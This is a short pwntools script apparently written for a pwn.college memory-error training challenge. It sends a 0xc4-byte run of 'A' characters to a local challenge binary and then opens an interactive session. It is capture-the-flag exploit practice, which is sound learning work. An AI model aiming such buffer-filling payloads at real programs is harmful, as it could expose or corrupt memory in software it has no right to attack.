```
#!/usr/bin/python3
from pwn import *
import re
import sys
import time

context.log_level="debug"

##while True:
p=process("/home/thtad/Desktop/pwncollege/mem_error/lingering-leftover/lingering-leftover-hard")

payload=b"A"*(0xc4)

p.recvuntil("Payload size:")
p.sendline(str(0xc4).encode())
p.recvuntil("bytes)!")
p.send(payload)

p.interactive()
```